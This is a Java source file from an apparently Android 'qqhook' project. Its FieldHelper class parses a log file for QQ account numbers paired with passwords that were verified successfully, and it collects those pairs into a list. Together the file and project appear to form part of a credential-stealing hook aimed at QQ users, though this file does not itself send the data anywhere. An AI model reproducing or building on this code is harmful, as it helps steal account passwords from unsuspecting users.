package com.dhb.qqhook.util;

import android.os.Environment;

import com.dhb.qqhook.Common;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by DHB on 2015/12/30.
 */
public class FieldHelper {
    private static List<QqInfo> qqInfoList;
    private static final String TAG = FieldHelper.class.getName();

    public FieldHelper() {
        qqInfoList = new ArrayList<>();
    }

    public List<QqInfo> getQqInfoList() {
        set();
        return qqInfoList;
    }

    private void set() {
        File file = new File(Common.path);
        BufferedReader reader;
        String temp;
        try {
            reader = new BufferedReader(new FileReader(file));
            while ((temp = reader.readLine()) != null) {
                if (temp.contains("QQ:")) {
                    String s = reader.readLine();
                    if (s == null)
                        return;
                    if (s.contains("密码:")&&reader.readLine().contains("密码验证成功！")) {
                        QqInfo qqInfo = new QqInfo();
                        qqInfo.setQq(temp);
                        qqInfo.setKey(s);
                        qqInfoList.add(qqInfo);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
//            try {
//                reader.close();
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
        }
    }
}
